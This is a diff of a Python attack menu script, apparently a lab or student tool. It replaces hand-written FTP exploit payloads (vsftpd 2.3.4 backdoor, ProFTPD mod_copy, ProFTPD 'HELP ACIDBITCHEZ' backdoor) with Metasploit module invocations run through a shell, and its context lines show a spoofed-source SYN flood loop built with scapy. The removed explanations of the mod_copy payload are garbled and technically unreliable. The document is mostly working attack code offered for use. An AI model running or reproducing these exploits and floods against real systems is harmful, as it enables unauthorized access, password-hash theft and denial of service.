@@ -79,79 +79,37 @@ def perform_dos(ip_addr=None):
 
 # (6) Code to perform ftp attack
 def perform_ftp_attack():
-    fsIP = "192.168.200.55"
+    ip_addr = "192.168.200.55"
 
     print("(1) Exploit the vsftpd 2.3.4 backdoor vulnerability")
     print("(2) Exploit the ProFTPD 1.3.3c mod_copy command execution vulnerability")
     print("(3) Exploit the ProFTPD 1.3.3c backdoor command execution vulnerability")
+
     # Get input from the user
     choice = input("Enter the number of the attack to perform: ")
 
     if choice == "1":
-        payload = "USER anonymous:)\nPASS somepassword\n"
-        return exploit_ftp(fsIP, payload)
+        metasploit_command = f"msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; run'"
+        return exploit_ftp(metasploit_command)
     elif choice == "2":
-        payload = "sSITE CPFR /proc/self/cmdline\nSITE CPTO /tmp/cmdline\nSITE CPFR /tmp/cmdline\nSITE CPTO /etc/shadow\n"
-        return exploit_ftp(fsIP, payload)
+        metasploit_command = f"msfconsole -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {ip_addr}; run'"
+        return exploit_ftp(metasploit_command)
     elif choice == "3":
-        payload = "HELP ACIDBITCHEZ\n"
-        return exploit_ftp(fsIP, payload)
+        metasploit_command = f"msfconsole -x 'use exploit/unix/ftp/proftpd_133c_backdoor; set RHOSTS {ip_addr}; run'"
+        return exploit_ftp(metasploit_command)
     else:
         print("Invalid choice\n")
         return perform_ftp_attack()
 
 
-"""
-Exploiting the vsftpd 2.3.4 backdoor vulnerability:
-
-Payload: "USER anonymous:)\nPASS somepassword\n"
-Explanation:    This payload consists of the FTP commands to exploit the backdoor. 
-                It starts with the USER command with the username set to "anonymous:)" 
-                and the PASS command with the password set to "somepassword". 
-                The backdoor vulnerability triggers when these specific commands are sent, 
-                granting unauthorized access to the FTP server.
-
-Exploiting the ProFTPD 1.3.3c mod_copy command execution vulnerability:
-
-Payload: "SITE CPFR /proc/self/cmdline\nSITE CPTO /tmp/cmdline\nSITE CPFR /tmp/cmdline\nSITE CPTO /etc/shadow\n"
-Explanation:    This payload utilizes the SITE command to exploit the mod_copy vulnerability. 
-                It consists of a series of CPFR (Copy From) and CPTO (Copy To) commands. 
-                It first copies the /proc/self/cmdline file to /tmp/cmdline and then copies it again 
-                from /tmp/cmdline to /etc/shadow. This sequence of commands tricks the server into overwriting 
-                the /etc/shadow file, which contains password hashes, with the contents of the /proc/self/cmdline file, 
-                leading to unauthorized access to the password hashes.
-
-Exploiting the ProFTPD 1.3.3c backdoor command execution vulnerability:
-
-Payload: "HELP ACIDBITCHEZ\n"
-Explanation:    This payload leverages the backdoor vulnerability in ProFTPD. It sends the HELP command 
-                with an argument of "ACIDBITCHEZ". When this specific command with the correct argument is sent, 
-                it triggers the backdoor and grants unauthorized access to the FTP server.
-                These payloads are carefully crafted to exploit the specific vulnerabilities in each FTP server version
-                and trigger the desired malicious behavior.
-"""
-
-
-# Destination port set to 21 (the FTP control port).
-# The payload contains the malicious commands to exploit the backdoor.
-def exploit_ftp(ip_addr, payload):
-    # Craft the malicious packet to exploit the backdoor vulnerability
-    # packet = IP(dst=ip_addr) / TCP(dport=21, flags="PA") / payload
-
-    # Send the malicious packet
-    # send(packet)
-
-    # Connect to the target FTP server
-    ftp = ftplib.FTP(ip_addr)
-    ftp.login()
-
-    # Send the malicious payload to the server
-    ftp.sendcmd(payload)
-
-    # Close the FTP connection
-    ftp.quit()
-
-    return "Exploit packet sent."
+# The metasploit_command contains the malicious commands to exploit the backdoor.
+def exploit_ftp(metasploit_command):
+    try:
+        # Execute the Metasploit command using subprocess
+        subprocess.run(metasploit_command, shell=True)
+        return "Exploit executed successfully."
+    except Exception as e:
+        return f"An error occurred: {str(e)}"
 
 
 # (7) Code to perform ip address sweep
@@ -306,11 +264,10 @@ def perform_syn_flood_attack(ip_addr=None, port="139"):
         ip_addr = input("Enter the IP address to attack: ")
 
     packet = IP(src=RandIP(), dst=ip_addr) / TCP(dport=int(port), flags="S")
-    
+
     send(packet, inter=0.00005, loop=1, verbose=0)
 
     return "SYN flood attack performed on " + ip_addr + " to port " + port
-
 
 
 # (12) Code to perform icmp flood attack
